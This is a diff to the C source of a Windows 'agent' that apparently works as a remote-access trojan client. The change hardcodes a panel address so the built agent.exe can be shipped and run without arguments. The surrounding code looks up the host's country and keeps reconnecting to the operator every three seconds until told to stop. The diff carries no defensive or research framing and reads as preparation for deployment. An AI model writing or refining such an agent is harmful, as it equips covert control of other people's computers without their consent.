@@ -5,6 +5,12 @@
 #include <wininet.h>
 #include <stdio.h>
 
+// ── config ──────────────────────────────────────────────────────────────────
+// Panel address for the agent. Edit this line, rebuild, ship agent.exe.
+// A host:port passed on the command line still overrides it.
+static const char kServer[] = "127.0.0.1:8443";
+// ────────────────────────────────────────────────────────────────────────────
+
 static TlsCtx* g_tls = NULL;
 static volatile LONG g_run = 1;
 static volatile LONG g_bye = 0;   // set only when the operator sends C_BYE
@@ -183,8 +189,7 @@ static void FetchCountry() {
   InternetCloseHandle(h);
 }
 
-static DWORD WINAPI Worker(LPVOID param) {
-  const char* addr = (const char*)param;
+static DWORD WINAPI Worker(const char* addr) {
   char host[256] = {0}; int port = 8443;
   strncpy(host, addr, 255);
   char* colon = strchr(host, ':');
@@ -268,12 +273,13 @@ done:
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
   InitializeCriticalSection(&g_cs);
   WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
-  if (!lpCmdLine || !*lpCmdLine) return 0;
+  const char* addr = (lpCmdLine && *lpCmdLine) ? lpCmdLine : kServer;
+  while (*addr == ' ') addr++;
   FetchCountry();
   // Panel may be closed, crashed or restarted; a remote agent must survive that
   // and keep trying. Only an explicit "Disconnect client" (C_BYE) ends it.
   while (!g_bye) {
-    Worker(lpCmdLine);
+    Worker(addr);
     if (!g_bye) Sleep(3000);
   }
   return 0;
